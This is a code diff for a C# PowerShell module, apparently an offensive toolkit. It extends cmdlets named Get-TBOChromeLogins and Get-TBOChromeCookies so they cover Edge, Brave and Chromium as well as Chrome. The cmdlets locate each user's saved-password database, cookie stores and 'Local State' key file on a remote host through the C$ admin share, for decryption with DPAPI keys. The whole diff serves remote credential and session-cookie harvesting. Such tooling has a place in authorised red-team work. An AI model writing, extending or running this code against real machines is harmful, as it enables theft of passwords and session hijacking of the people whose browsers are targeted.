@@ -22,9 +22,12 @@ namespace Titanis.Tbo.Smb2.PowerShell
 	{
 		internal const string DefaultShareName = "C$";
 		internal const string DefaultProfileName = "Default";
+		internal const string DefaultBrowser = "Chrome";
 
 		private const string ChromeUserDataRoot = @"AppData\Local\Google\Chrome\User Data";
-		private const string ChromeLocalStateRelativePath = ChromeUserDataRoot + @"\Local State";
+		private const string EdgeUserDataRoot = @"AppData\Local\Microsoft\Edge\User Data";
+		private const string BraveUserDataRoot = @"AppData\Local\BraveSoftware\Brave-Browser\User Data";
+		private const string ChromiumUserDataRoot = @"AppData\Local\Chromium\User Data";
 		private const string ChromeProfilePrefix = "Profile ";
 		private const string ChromeGuestProfileName = "Guest Profile";
 		private const string ChromeSystemProfileName = "System Profile";
@@ -36,6 +39,41 @@ namespace Titanis.Tbo.Smb2.PowerShell
 
 		internal static string NormalizeShareName(string? shareName)
 			=> DpapiHelpers.NormalizeShareName(shareName);
+
+		internal static string NormalizeBrowserName(string? browserName)
+		{
+			var value = string.IsNullOrWhiteSpace(browserName) ? DefaultBrowser : browserName.Trim();
+
+			if (value.Equals("Chrome", StringComparison.OrdinalIgnoreCase))
+				return "Chrome";
+			if (value.Equals("Edge", StringComparison.OrdinalIgnoreCase))
+				return "Edge";
+			if (value.Equals("Brave", StringComparison.OrdinalIgnoreCase))
+				return "Brave";
+			if (value.Equals("Chromium", StringComparison.OrdinalIgnoreCase))
+				return "Chromium";
+
+			throw new ArgumentException($"Unsupported browser '{value}'.", nameof(browserName));
+		}
+
+		internal static string GetUserDataRootRelativePath(string browserName)
+		{
+			var browser = NormalizeBrowserName(browserName);
+
+			if (browser.Equals("Chrome", StringComparison.OrdinalIgnoreCase))
+				return ChromeUserDataRoot;
+			if (browser.Equals("Edge", StringComparison.OrdinalIgnoreCase))
+				return EdgeUserDataRoot;
+			if (browser.Equals("Brave", StringComparison.OrdinalIgnoreCase))
+				return BraveUserDataRoot;
+			if (browser.Equals("Chromium", StringComparison.OrdinalIgnoreCase))
+				return ChromiumUserDataRoot;
+
+			throw new ArgumentOutOfRangeException(nameof(browserName), browserName, "Unsupported browser.");
+		}
+
+		internal static string GetLocalStateRelativePath(string browserName)
+			=> GetUserDataRootRelativePath(browserName) + @"\Local State";
 
 		internal static IReadOnlyList<WildcardPattern> BuildUserFilters(string[]? filters)
 		{
@@ -144,10 +182,10 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			return results;
 		}
 
-		internal static UncPath GetUserDataRootPath(string serverName, string shareName, string userName)
+		internal static UncPath GetUserDataRootPath(string serverName, string shareName, string userName, string browserName)
 		{
 			var userRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userName}");
-			return userRoot.Append(ChromeUserDataRoot);
+			return userRoot.Append(GetUserDataRootRelativePath(browserName));
 		}
 
 		internal static IReadOnlyList<string> EnumerateProfileDirectories(
@@ -155,6 +193,7 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			string serverName,
 			string shareName,
 			string userName,
+			string browserName,
 			Action<string>? logWarning,
 			Action<string>? logVerbose,
 			Action<string, Exception>? logException,
@@ -164,7 +203,7 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			logVerbose ??= _ => { };
 			logException ??= (context, ex) => smb.LogException(context, ex);
 
-			var userDataRoot = GetUserDataRootPath(serverName, shareName, userName);
+			var userDataRoot = GetUserDataRootPath(serverName, shareName, userName, browserName);
 			var fileSystem = SmbFileSystemResolver.Resolve(smb);
 
 			var results = new List<string>();
@@ -212,24 +251,26 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			return SortProfileNames(results);
 		}
 
-		internal static UncPath GetLocalStatePath(string serverName, string shareName, string userName)
+		internal static UncPath GetLocalStatePath(string serverName, string shareName, string userName, string browserName)
 		{
 			var userRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userName}");
-			return userRoot.Append(ChromeLocalStateRelativePath);
+			return userRoot.Append(GetLocalStateRelativePath(browserName));
 		}
 
-		internal static UncPath GetLoginDataPath(string serverName, string shareName, string userName, string profileName)
+		internal static UncPath GetLoginDataPath(string serverName, string shareName, string userName, string browserName, string profileName)
 		{
 			var userRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userName}");
-			return userRoot.Append($@"{ChromeUserDataRoot}\{profileName}\Login Data");
+			var userDataRoot = GetUserDataRootRelativePath(browserName);
+			return userRoot.Append($@"{userDataRoot}\{profileName}\Login Data");
 		}
 
-		internal static (UncPath NetworkCookies, UncPath LegacyCookies) GetCookiePaths(string serverName, string shareName, string userName, string profileName)
+		internal static (UncPath NetworkCookies, UncPath LegacyCookies) GetCookiePaths(string serverName, string shareName, string userName, string browserName, string profileName)
 		{
 			var userRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userName}");
+			var userDataRoot = GetUserDataRootRelativePath(browserName);
 			return (
-				userRoot.Append($@"{ChromeUserDataRoot}\{profileName}\Network\Cookies"),
-				userRoot.Append($@"{ChromeUserDataRoot}\{profileName}\Cookies")
+				userRoot.Append($@"{userDataRoot}\{profileName}\Network\Cookies"),
+				userRoot.Append($@"{userDataRoot}\{profileName}\Cookies")
 			);
 		}
 
@@ -999,6 +1040,10 @@ namespace Titanis.Tbo.Smb2.PowerShell
 		public string ShareName { get; set; } = ChromeHelpers.DefaultShareName;
 
 		[Parameter]
+		[ValidateSet("Chrome", "Edge", "Brave", "Chromium")]
+		public string Browser { get; set; } = ChromeHelpers.DefaultBrowser;
+
+		[Parameter]
 		public string ProfileName { get; set; } = ChromeHelpers.DefaultProfileName;
 
 		[Parameter]
@@ -1025,6 +1070,8 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			if (string.IsNullOrWhiteSpace(shareName))
 				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));
 
+			var browser = ChromeHelpers.NormalizeBrowserName(this.Browser);
+
 			var requestedProfileName = string.IsNullOrWhiteSpace(this.ProfileName)
 				? ChromeHelpers.DefaultProfileName
 				: this.ProfileName.Trim();
@@ -1046,13 +1093,14 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			{
 				cancellationToken.ThrowIfCancellationRequested();
 
-				var localStatePath = ChromeHelpers.GetLocalStatePath(serverName, shareName, user);
+				var localStatePath = ChromeHelpers.GetLocalStatePath(serverName, shareName, user, browser);
 				var profiles = this.AllProfiles.IsPresent
 					? ChromeHelpers.EnumerateProfileDirectories(
 						smb,
 						serverName,
 						shareName,
 						user,
+						browser,
 						logWarning: msg => this.LogWarning(smb, msg),
 						logVerbose: msg => this.LogVerbose(smb, msg),
 						logException: (context, ex) => this.LogException(smb, context, ex),
@@ -1061,8 +1109,8 @@ namespace Titanis.Tbo.Smb2.PowerShell
 
 				if (profiles.Count == 0)
 				{
-					var userDataRoot = ChromeHelpers.GetUserDataRootPath(serverName, shareName, user);
-					this.LogVerbose(smb, $"Get-TBOChromeLogins found no Chrome profiles under {userDataRoot} for user '{user}'.");
+					var userDataRoot = ChromeHelpers.GetUserDataRootPath(serverName, shareName, user, browser);
+					this.LogVerbose(smb, $"Get-TBOChromeLogins found no {browser} profiles under {userDataRoot} for user '{user}'.");
 					continue;
 				}
 
@@ -1077,7 +1125,7 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				{
 					cancellationToken.ThrowIfCancellationRequested();
 
-					var loginDataPath = ChromeHelpers.GetLoginDataPath(serverName, shareName, user, profile);
+					var loginDataPath = ChromeHelpers.GetLoginDataPath(serverName, shareName, user, browser, profile);
 					ProcessLoginDbWithRetries(
 						smb,
 						serverName,
@@ -1227,6 +1275,10 @@ namespace Titanis.Tbo.Smb2.PowerShell
 		public string ShareName { get; set; } = ChromeHelpers.DefaultShareName;
 
 		[Parameter]
+		[ValidateSet("Chrome", "Edge", "Brave", "Chromium")]
+		public string Browser { get; set; } = ChromeHelpers.DefaultBrowser;
+
+		[Parameter]
 		public string ProfileName { get; set; } = ChromeHelpers.DefaultProfileName;
 
 		[Parameter]
@@ -1253,6 +1305,8 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			if (string.IsNullOrWhiteSpace(shareName))
 				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));
 
+			var browser = ChromeHelpers.NormalizeBrowserName(this.Browser);
+
 			var requestedProfileName = string.IsNullOrWhiteSpace(this.ProfileName)
 				? ChromeHelpers.DefaultProfileName
 				: this.ProfileName.Trim();
@@ -1274,13 +1328,14 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			{
 				cancellationToken.ThrowIfCancellationRequested();
 
-				var localStatePath = ChromeHelpers.GetLocalStatePath(serverName, shareName, user);
+				var localStatePath = ChromeHelpers.GetLocalStatePath(serverName, shareName, user, browser);
 				var profiles = this.AllProfiles.IsPresent
 					? ChromeHelpers.EnumerateProfileDirectories(
 						smb,
 						serverName,
 						shareName,
 						user,
+						browser,
 						logWarning: msg => this.LogWarning(smb, msg),
 						logVerbose: msg => this.LogVerbose(smb, msg),
 						logException: (context, ex) => this.LogException(smb, context, ex),
@@ -1289,8 +1344,8 @@ namespace Titanis.Tbo.Smb2.PowerShell
 
 				if (profiles.Count == 0)
 				{
-					var userDataRoot = ChromeHelpers.GetUserDataRootPath(serverName, shareName, user);
-					this.LogVerbose(smb, $"Get-TBOChromeCookies found no Chrome profiles under {userDataRoot} for user '{user}'.");
+					var userDataRoot = ChromeHelpers.GetUserDataRootPath(serverName, shareName, user, browser);
+					this.LogVerbose(smb, $"Get-TBOChromeCookies found no {browser} profiles under {userDataRoot} for user '{user}'.");
 					continue;
 				}
 
@@ -1305,7 +1360,7 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				{
 					cancellationToken.ThrowIfCancellationRequested();
 
-					var (networkCookiesPath, legacyCookiesPath) = ChromeHelpers.GetCookiePaths(serverName, shareName, user, profile);
+					var (networkCookiesPath, legacyCookiesPath) = ChromeHelpers.GetCookiePaths(serverName, shareName, user, browser, profile);
 
 					// Prefer Network\\Cookies (newer Chrome path), fall back to legacy Cookies.
 					if (!TryProcessCookiesPath(smb, serverName, user, profile, networkCookiesPath, stateKey, masterKeySet, cancellationToken))
